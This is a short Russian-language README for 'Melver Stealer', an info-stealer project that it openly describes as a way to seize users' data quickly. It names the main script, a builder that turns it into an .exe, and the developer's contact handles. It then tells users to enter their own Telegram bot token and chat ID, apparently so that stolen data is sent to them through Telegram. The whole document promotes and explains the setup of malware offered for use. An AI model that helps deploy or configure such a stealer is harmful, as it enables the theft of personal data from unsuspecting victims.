# Привествуем в проекте MELVER STEALER - проект позволюющий в два счета завладеть данными пользователя
# Навигация:

#######################################################################################
#                                                                                     #
#       Основной код: stealer/Melver.py                                               #
#       Сделать .exe: complectation.py                                                #
#       Разработчик: Yoshiko                                                          #
#       Соцсети:| Discord: culturing | Telegram: @autuming |                          #
#       Активный репозиторий: https://github.com/twelwy22/Melver                      #
#                                                                                     #
#######################################################################################

# в файле Melver.py замените telegram_api_token и chat_id на свои
# telegram_api_token - можно получить в @BotFather 
# chat_id - можно получить в @getidsbot
# Приятного использования!